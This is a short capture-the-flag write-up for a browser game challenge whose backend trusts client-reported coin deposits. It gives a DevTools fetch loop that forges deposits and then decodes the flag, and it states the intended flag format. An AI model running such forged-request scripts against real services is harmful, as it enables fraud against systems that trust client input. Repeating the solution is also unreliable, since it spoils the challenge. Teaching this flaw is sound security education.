# Write-up — The Goblin’s Debt

The game UI suggests collecting 23 coins and repeating the journey until
the 120-coin debt is paid. The backend API trusts the browser's reported
coin count, however; it does not verify that a journey was completed.

From the challenge origin, open DevTools and submit six valid maximum
deposits. Six deposits of 23 are capped by the server at the 120-coin goal:

```js
for (let i = 0; i < 6; i++) {
  await fetch('/api/ledger/deposit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ coins: 23 })
  });
}

const data = await fetch('/api/reward').then((r) => r.json());
console.log(atob(data.flag));
```

The weakness is a client-trusted progress counter. The reward endpoint
Base64-encodes the dynamically supplied flag, so decoding `data.flag`
reveals the local dummy flag or the team-specific event flag.

## Intended flag

```text
ACM{cl13nt_s1d3_tru5t_<hash>}
```
